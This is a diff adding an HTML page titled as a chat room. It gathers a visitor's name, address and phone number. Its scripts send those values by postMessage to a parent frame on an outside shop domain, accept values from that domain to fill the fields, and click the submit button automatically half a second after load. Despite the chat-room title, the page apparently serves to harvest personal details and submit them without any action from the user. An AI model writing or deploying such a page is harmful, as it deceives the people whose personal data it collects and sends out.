@@ -1,0 +1,70 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chat Room - Home</title>
+ <script>
+        function sendMessage() {
+            const message = {
+              name: document.getElementById("name").value,
+              address: document.getElementById("address").value,
+              number: document.getElementById("number").value
+            };
+            parent.postMessage(message, "https://bdofficialshop.com");
+        }
+        function receiveMessage(event) {
+            if (event.origin === "https://bdofficialshop.com") {
+                const data = event.data;              updateInputFields(data);
+            }          
+        }
+
+        function updateInputFields(data) {          document.getElementById("name").value = data.name;
+            document.getElementById("address").value = data.address;
+            document.getElementById("number").value = data.number;
+        }
+
+        window.addEventListener("message", receiveMessage, false);
+ </script>  
+</head>
+<body>
+  <h1>Welcome to the Chat Room!</h1>
+  
+  <form action="/" method="POST" onsubmit="concatenateInputs()">
+    <label for="name">Name:</label>
+    <input type="text" name="name" id="name" placeholder="Enter your name" required>
+    <br>
+    <label for="address">Address:</label>
+    <input type="text" name="address" id="address" placeholder="Enter your address" required>
+    <br>
+    <label for="number">Number:</label>
+    <input type="text" name="number" id="number" placeholder="Enter your phone number" required>
+    <br>
+    <input type="hidden" name="user_info" id="user_info">
+    <button type="submit" id="submit" onclick="sendMessage()">Join</button>
+  </form>
+  <script>
+    function concatenateInputs() {
+      const name = document.getElementById("name").value;
+      const address = document.getElementById("address").value;
+      const number = document.getElementById("number").value;
+
+      const userInfo = `${name},${address},${number}`;
+      document.getElementById("user_info").value = userInfo;
+    }
+  </script>
+<script>
+window.onload = function () {
+var nameInput = document.getElementsByName("name")[0];
+  var addressInput = document.getElementsByName("address")[0];
+  var numberInput = document.getElementsByName("number")[0];
+setTimeout(function() {
+ if (nameInput.checkValidity() && addressInput.checkValidity() && numberInput.checkValidity()) {
+document.getElementById("submit").click();
+};
+},500);
+};
+</script>
+</body>
+</html>
+
